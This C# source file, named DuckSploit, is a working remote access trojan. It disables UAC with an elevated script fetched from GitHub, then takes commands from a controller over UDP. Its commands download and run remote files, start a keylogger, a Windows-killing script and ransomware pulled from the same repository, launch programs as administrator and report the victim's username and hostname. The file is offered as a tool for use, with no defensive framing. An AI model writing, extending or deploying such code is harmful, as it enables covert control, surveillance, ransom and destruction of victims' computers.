using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO.Compression;
using System.Web;
using System.Threading;
using System.Text.RegularExpressions;



namespace DuckSploit
{
	public class Program
	{					
		public static void Download(string url, string outPath)
		{
			string tempdir = Path.GetTempPath();
			
			execute_cmd("if exist " + tempdir + "\\download.ps1 (del " + tempdir + "\\download.ps1)");			
			
			
			url = '"' + url + '"';
			
			outPath = '"' + outPath + '"';
			
			string str = "(New-Object System.Net.WebClient).DownloadFile(" + url + ", " + outPath + ")";
			
			outPath = tempdir + "/download.ps1";
			
            // open or create file
            FileStream streamfile = new FileStream(outPath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
			outPath = '"' + tempdir + "/download.ps1" + '"';
			
			
			// string powershelldownloadtxt = "" + url +"\  "
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
			

			// string error = "";
			// int exitCode = 0;
			string output = "";
			
			ProcessStartInfo processInfo;
			Process process;
			processInfo = new ProcessStartInfo("cmd.exe", "/c powershell " + tempdir + "\\download.ps1");
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
			
		}
		public static void write_txt_to_file(string path, string str)
		{
			FileStream streamfile = new FileStream(path, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			
            streamwrite.WriteLine(str);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
		}
		public static void execute(string path)
        {
            
			
			string callcommand = "/c call " + path ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void execute_cmd(string cmd)
        {
            
			
			string callcommand = "/c " + cmd ;
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("cmd.exe", callcommand);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		public static void execute_cmd_asadmin(string cmd)
        {
			string callcommand2 = "start-process cmd -verb runas -ArgumentList '/c " + cmd + "'";
			
			ProcessStartInfo processInfo;
			Process process;
			
			string output = "";
			
			processInfo = new ProcessStartInfo("powershell.exe", callcommand2);
			processInfo.CreateNoWindow = true;
			processInfo.UseShellExecute = false;
			processInfo.RedirectStandardOutput = true;
			process = Process.Start(processInfo);
			process.WaitForExit();
			output = process.StandardOutput.ReadToEnd();
        }
		
		
		
		
		public static void Main(string[] args)
		{
			string tempdir = Path.GetTempPath(); 
			Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/uac/disable.vbs", tempdir + "/uacdisable.vbs");
			execute_cmd_asadmin("call " + tempdir + "/uacdisable.vbs");
			
			
			string output = "";

			UdpClient udpClient = new UdpClient(0);

			try{
				udpClient.Connect("IP", 443);

				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");

				udpClient.Send(sendBytes, sendBytes.Length);

				IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

				while(true){
					Byte[] receiveBytes = udpClient.Receive(ref RemoteIpEndPoint);
					string returnData = Encoding.ASCII.GetString(receiveBytes);
					
					
					
					
					// Console.WriteLine("Received command from " + RemoteIpEndPoint.Address.ToString());
					
					output = "";
					string ipv4 = "";
					string hostname = Dns.GetHostName();

					
					
					string[] result = returnData.Split(' ');
					
					// string output = "null";
					
					if(result[0] == "help")
					{
						output = "";
					}
					else if(result[0] == "exit")
					{
						System.Environment.Exit(1);
					}
					else if(result[0] == "download")
					{
						if(result.Length == 3)
						{
							string downloadurl = result[1];
							string downloadpath = result[2];
							Download(downloadurl, downloadpath);
							output = "This file successfully downloaded to " + result[2];
						}
						else
						{
							output = "Usage: download <url> <path>";
						}
						
						
						
					}
					else if(result[0] == "malware")
					{
						if(result.Length == 2)
						{
							if(result[1] == "keylogger")
							{
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/keylogger.vbs", tempdir + "/keylogger.vbs");
							
								output = "Keylogger started, see keyloggs at http://{vicitm IP}:8080/keylogger/keylogg.txt";
							
								execute_cmd("start " + tempdir + "\\keylogger.vbs");
							
							}
							else if(result[1] == "winkiller")
							{
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/winkiller.bat", tempdir + "/winkiller.bat");
							
								execute_cmd("start " + tempdir + "\\winkiller.bat");
							
								output = "Trying to kill windows";
							}
							else if(result[1] == "--help")
							{
								output = "";
							}
							else if(result[1] == "ransomware")
							{
								
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/blockmousenkeyboard.ps1", tempdir + "/ransomware2.ps1");
								Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/malwares/ransomware.bat", tempdir + "/ransomware.bat");
								
								execute_cmd_asadmin("start " + tempdir + "\\ransomware.bat");
								
								
								output = "Ransomwared!";
							}
							else
							{
								output = "Arg not found!";
							}
						}
						else
						{
							output = "malware --help to get malware list";
						}
					}
					else if(result[0] == "open")
					{
						if(result.Length == 3)
						{
							if(result[1] == "--asadmin")
							{
								execute_cmd_asadmin("start " + result[2]);
								output = result[2] + " has been started as admin!";
							}	
							else
							{
								execute_cmd("start " + result[1] + result[2]);
								output = result[1] + " has been started!";
							}
						}
						else if(result.Length == 2)
						{
							execute_cmd("start " + result[1]);
							output = result[1] + " has been started!";
						}
						else
						{
							output = "Usage: open [--asadmin] <package>, to start selected package";
						}
					}
					else if(result[0] == "info")
					{
						string line1 = "Username: " + Environment.UserName;
						string line2 = "IPV4: " + ipv4;
						string line3 = "HostName: " + hostname;
						string line4 = "NetworkIP: 0.0.0.0";
						string jumpline = @"
";
						output = line1 + jumpline + line2 + jumpline + line3 + jumpline + line4;
					}
					else if(result[0] == "msg")
					{
						if(result.Length == 4)
						{
							write_txt_to_file(tempdir + "/msg.vbs", "MsgBox \"" + result[2] + "\" & vbCrLf & \"" + result[3] + "\" ,16, \"" + result[1] + "\"");
							execute(tempdir + "/msg.vbs");
							output = "Sended message!";
						}
						else
						{
							output = "Usage: msg <title> <line1> <line2>!";
						}
					}
					else if(result[0] == "notif")
					{
						if(result.Length == 3)
						{
							Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/api/scripts/notif.ps1", tempdir + "/notif.ps1");
							string text = File.ReadAllText(tempdir + "/notif.ps1");
							text = text.Replace("<title>", '"' + result[1] + '"');
							text = text.Replace("<message>", '"' + result[2] + '"');
							File.WriteAllText(tempdir + "/notif.ps1", text);
							execute_cmd("powershell " + tempdir + "/notif.ps1");
						}
						else
						{
							output = "Usage: notif <title> <message>";
						}
					}
					else if(result[0] == "host")
					{
						if(Directory.Exists(tempdir + "/host"))
						{
							execute_cmd("start " + tempdir + "/host/host/launch.vbs");
							output = "HOSTING AT <victim IP>:8080.";
						}
						else
						{
							// get host.zip
							Download("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/host/host.zip",tempdir + "/host.zip");
							execute_cmd("powershell Expand-Archive -Path $env:TEMP\\host.zip -DestinationPath $env:TEMP\\host");
							
							execute_cmd("start " + tempdir + "/host/host/launch.vbs");
							
							output = "HOSTING AT <victim IP>:8080";
						}
						
					}
					
					Console.WriteLine(output);

					Byte[] outputtobytes = Encoding.ASCII.GetBytes(output);

					udpClient.Send(outputtobytes, outputtobytes.Length);

				}
				// udpClient.End();

			}
			catch (Exception e ) {
				Console.WriteLine(e.ToString());
			}

		}

	}
}
